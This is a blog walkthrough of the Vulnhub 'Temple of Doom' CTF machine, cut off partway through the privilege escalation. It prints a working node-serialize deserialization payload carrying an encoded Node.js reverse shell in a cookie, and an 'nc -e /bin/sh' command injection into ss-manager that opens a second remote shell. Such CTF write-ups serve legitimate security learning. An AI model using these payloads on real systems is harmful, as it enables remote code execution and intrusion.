---
layout:     post
title:      "Vulnhub.com - Temple Of Doom 1"
date:       2018-07-20 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to walk through  very cool machine from Vulnhub called ***Temple of Doom***. 

{% highlight text %}
[+] A CTF created by https://twitter.com/0katz
[+] Difficulty: Easy/Intermediate
[+] Tested in VirtualBox
[+] Note: 2 ways to get root!
{% endhighlight %}

* Author: [0katz](https://twitter.com/0katz)
* Download: [https://www.vulnhub.com/entry/temple-of-doom-1,243/](https://www.vulnhub.com/entry/temple-of-doom-1,243/)

Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!

### Solution

Firstly, as always we're going to start with the `nmap` scan. 

* *-v* - verbose output
* *-sS* - TCP-SYN scan
* *-A* - OS detection, version detection and traceroute
* *-T4* - aggresive scan

{% highlight bash %}
root@kali:~# nmap -v -sS -A -T4 10.0.0.5
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-11 11:17 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Initiating ARP Ping Scan at 11:17
Scanning 10.0.0.5 [1 port]
Completed ARP Ping Scan at 11:17, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:17
Completed Parallel DNS resolution of 1 host. at 11:17, 0.00s elapsed
Initiating SYN Stealth Scan at 11:17
Scanning 10.0.0.5 [1000 ports]
Discovered open port 22/tcp on 10.0.0.5
Discovered open port 666/tcp on 10.0.0.5
Completed SYN Stealth Scan at 11:17, 0.12s elapsed (1000 total ports)
Initiating Service scan at 11:17
Scanning 2 services on 10.0.0.5
Completed Service scan at 11:17, 11.04s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.5
NSE: Script scanning 10.0.0.5.
Initiating NSE at 11:17
Completed NSE at 11:17, 1.18s elapsed
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Nmap scan report for 10.0.0.5
Host is up (0.00062s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)
666/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:BB:24:1C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 34.945 days (since Wed Jun  6 12:36:17 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 10.0.0.5

NSE: Script Post-scanning.
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
{% endhighlight %}

At the start I decided to check out port `666` running `NodeJS Express`.

{% highlight bash %}
root@kali:~# curl 10.0.0.5:666
Under Construction, Come Back Later!
{% endhighlight %}

As the content of the website doesn't tell us much, I decided to run `nikto` scan in the background. 

{% highlight bash %}
root@kali:~# nikto -h 10.0.0.5:666
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.5
+ Target Hostname:    10.0.0.5
+ Target Port:        666
+ Start Time:         2018-07-11 11:19:05 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/24 0xxWt5IUP3GfGbHraPgY5EGPpcNzA 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD 
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 6 item(s) reported on remote host
+ End Time:           2018-07-11 11:19:35 (GMT-4) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

In the meantime, while manually looking around at the webiste, I've noticed that at the second visit we get different content. In burpsuite we can also notice a profile cookie. 

{% highlight html %}
GET / HTTP/1.1
Host: 10.0.0.5:666
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1155
Date: Wed, 11 Jul 2018 15:21:14 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token F in JSON at position 79<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)<br> &nbsp; &nbsp;at /home/nodeadmin/.web/server.js:12:29<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)</pre>
</body>
</html>
{% endhighlight %}

As the cookie is `base64` encoded let's decode it. 

{% highlight json %}
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}
{% endhighlight %}

In addition we get the `unexpected token` error,  let's fix it by adding quotation marks at the start of the date. 

{% highlight json %}
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
{% endhighlight %}

Sending it with repeater in BurpSuite, we immediately  notice that the content of the website is correctly rendered. 

{% highlight html %}
GET / HTTP/1.1
Host: 10.0.0.5:666
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOiJGcmlkYXksIDEzIE9jdCAyMDE4IDAwOjAwOjAwIEdNVCJ9
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 11
ETag: W/"b-GWZKb4joaEb2aqpBlbdbhMNzgtI"
Date: Wed, 11 Jul 2018 15:23:09 GMT
Connection: close

Hello Admin
{% endhighlight %}

But this brings another attack vector that I remember from another machine - bug in `unserialize` function in NodeJS leading to remote code execution. You can read more [here](https://blog.websecurify.com/2017/02/hacking-node-serialize.html).

Firstly, let's create a reverse shell using this [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) with our IP and port to connect. 

{% highlight bash %}
root@kali:~# python js-reverseshell.py 10.0.0.4 1337
[+] LHOST = 10.0.0.4
[+] LPORT = 1337
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,48,46,48,46,52,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
{% endhighlight %}

Now we're ready to add it into the cookie. 

{% highlight json %}
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT", "rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,48,46,48,46,52,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
{% endhighlight %}

And now it's just a matter of encoding it with `base64` and sending back with repeater. Don't forget to set up a listener!

{% highlight html %}
GET / HTTP/1.1
Host: 10.0.0.5:666
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOiJGcmlkYXksIDEzIE9jdCAyMDE4IDAwOjAwOjAwIEdNVCIsICJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNDgsNDYsNDgsNDYsNDgsNDYsNTIsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTEsNTEsNTUsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0=
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 11
ETag: W/"b-GWZKb4joaEb2aqpBlbdbhMNzgtI"
Date: Wed, 11 Jul 2018 15:27:37 GMT
Connection: close

Hello Admin
{% endhighlight %}

We heave the connection. Great!

{% highlight bash %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.5: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.5] 56006
Connected!
ls -la
total 40
drwx------. 5 nodeadmin nodeadmin 4096 Jun  7 23:05 .
drwxr-xr-x. 4 root      root      4096 Jun  2 23:02 ..
-rw-------. 1 nodeadmin nodeadmin    1 Jun  7 23:04 .bash_history
-rw-r--r--. 1 nodeadmin nodeadmin   18 Mar 15 09:56 .bash_logout
-rw-r--r--. 1 nodeadmin nodeadmin  193 Mar 15 09:56 .bash_profile
-rw-r--r--. 1 nodeadmin nodeadmin  231 Mar 15 09:56 .bashrc
drwx------  3 nodeadmin nodeadmin 4096 Jun  1 13:24 .config
-rw-------  1 nodeadmin nodeadmin   16 Jun  3 16:41 .esd_auth
drwxr-xr-x  4 nodeadmin nodeadmin 4096 Jun  3 00:58 .forever
drwxrwxr-x. 3 nodeadmin nodeadmin 4096 May 30 17:44 .web
id 
uid=1001(nodeadmin) gid=1001(nodeadmin) groups=1001(nodeadmin)
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/sh")' 
sh-4.4$ /bin/bash
/bin/bash
[nodeadmin@localhost .forever]$ uname -a
uname -a
Linux localhost.localdomain 4.16.3-301.fc28.x86_64 #1 SMP Mon Apr 23 21:59:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

Now we're ready to escalate. Firstly I decided to check out `crontab`. Nothing interesting there. 

{% highlight bash %}
[nodeadmin@localhost ~]$ crontab -l
crontab -l
@reboot /bin/node /home/nodeadmin/.web/server.js &
{% endhighlight %}

But in `/etc/passwd` I notice that there is another user. 

{% highlight bash %}
[nodeadmin@localhost ~]$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:995:User for polkitd:/:/sbin/nologin
geoclue:x:997:993:User for geoclue:/var/lib/geoclue:/sbin/nologin
colord:x:996:992:User for colord:/var/lib/colord:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gluster:x:995:989:GlusterFS daemons:/run/gluster:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
chrony:x:994:988::/var/lib/chrony:/sbin/nologin
dnsmasq:x:987:987:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
openvpn:x:986:986:OpenVPN:/etc/openvpn:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
saslauth:x:985:76:Saslauthd user:/run/saslauthd:/sbin/nologin
nm-openvpn:x:984:983:Default user for running openvpn spawned by NetworkManager:/:/sbin/nologin
nm-openconnect:x:983:982:NetworkManager user for OpenConnect:/:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
pipewire:x:982:980:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
gnome-initial-setup:x:981:979::/run/gnome-initial-setup/:/sbin/nologin
vboxadd:x:980:1::/var/run/vboxadd:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
nginx:x:979:977:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:976:Webalizer:/var/www/usage:/sbin/nologin
nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash
fireman:x:1002:1002::/home/fireman:/bin/bash
{% endhighlight %}

I decided to check whether or not we can escalate to him, looking at different files, etc. However, while viewing running processes, I've noticed something strange. 

{% highlight bash %}
[nodeadmin@localhost ~]$ ps -aux | grep fireman
ps -aux | grep fireman
root       832  0.0  0.4 301464  4556 ?        S    04:39   0:00 su fireman -c /usr/local/bin/ss-manager
fireman    855  0.0  0.3  37060  3812 ?        Ss   04:39   0:00 /usr/local/bin/ss-manager
nodeadm+   954  0.0  0.0 213788   968 pts/0    S+   04:43   0:00 grep --color=auto fireman
{% endhighlight %}

We can see that `fireman` is running `ss-manager` as root. Googling for this service shows me this awesome exploit technique. Read more [here](https://www.exploit-db.com/exploits/43006/).

Following snippet will execute a `nc` reverse shell to our Kali machine. 

{% highlight bash %}
[nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839
nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"|| nc -e /bin/sh 10.0.0.4 4444 ||"}
ok
{% endhighlight %}

Now to our listener. 

{% highlight bash %}
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
10.0.0.5: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.5] 51256
python -c 'import pty;pty.spawn("/bin/bash")'
[fireman@localhost root]$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
[fireman@localhost root]$ cd /home/fireman
cd /home/fireman
[fireman@localhost ~]$ ls -la
ls -la
total 44
drwx------  6 fireman fireman 4096 Jun  7 23:10 .
drwxr-xr-x. 4 root    root    4096 Jun  2 23:02 ..
